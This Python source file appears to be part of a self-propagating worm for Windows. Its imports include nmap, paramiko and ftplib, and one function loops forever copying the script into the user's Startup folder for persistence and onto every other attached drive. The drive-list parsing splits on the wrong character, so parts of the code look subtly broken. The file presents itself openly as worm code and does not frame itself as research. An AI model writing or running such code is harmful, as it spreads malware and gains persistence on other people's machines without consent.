import nmap
import paramiko
import os
import socket
from urllib.request import urlopen
import urllib, time, ftplib, win32api
import coloredlogs, logging
import netifaces
import _winapi
from threading import Thread
import networking
from shutil import copy2

logger = logging.getLogger(__name__)
coloredlogs.install(fmt='%(message)s', level='DEBUG', logger=logger)

# gets gateway of the newtwork

def dive_spreading():
    '''
    this function makes the wrom copy itself 
    on other drives on the computer
    
    '''
    bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
    
    while True:
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\100')[:-1]
        print(drives)
        for drive in drives:
            try:
                if "C:\\" == drive:
                    copy2(__file__, bootfolder)
                else:
                    copy2(__file__, drive)
            except:
                print('Error')
                pass
        
        time.sleep(3)


def start_drive_spreading():
    '''
        using threads to gain in terms of performance
    '''
    thread = Thread(target = dive_spreading)
    thread.start()        

                    
                    
                    
                    
                    